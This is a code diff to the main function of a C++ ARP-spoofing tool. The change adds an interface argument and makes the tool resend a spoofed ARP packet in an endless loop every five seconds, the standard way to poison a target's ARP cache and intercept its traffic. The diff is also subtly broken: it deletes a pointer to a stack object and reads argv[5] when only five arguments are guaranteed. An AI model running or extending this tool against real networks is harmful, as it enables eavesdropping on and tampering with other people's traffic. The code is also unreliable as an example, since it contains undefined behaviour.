@@ -4,13 +4,11 @@
 int main(int argc, char* argv[])
 {
     if(argc == 1){
-        std::cout << "Help: ./arpspoof sourceMAC targetMAC sourceIP targetIP" << std::endl;
-        // return 0;
+        std::cout << "Help: ./arpspoof sourceMAC targetMAC sourceIP targetIP interface" << std::endl;
+        return 0;
     }
 
     EthernetPacket eth;
-    std::cout << sizeof(eth) <<  std::endl;
-    std::cout << sizeof(eth.arp) <<  std::endl;
 
     if(argc >= 5){
         eth.setSIP(argv[1]);
@@ -29,9 +27,14 @@ int main(int argc, char* argv[])
     }
     std::cout << eth.toString() << std::endl;
 
-
     EthernetPacket * e = &eth;
-    sendPacket(e);
+    while(1){
+        sendPacket(e, argv[5]);
+        // std::cout << "reply sent" << std::endl;
+        usleep(5*1000000);
+    }
+
+    delete e;
 
     return 0;
 }
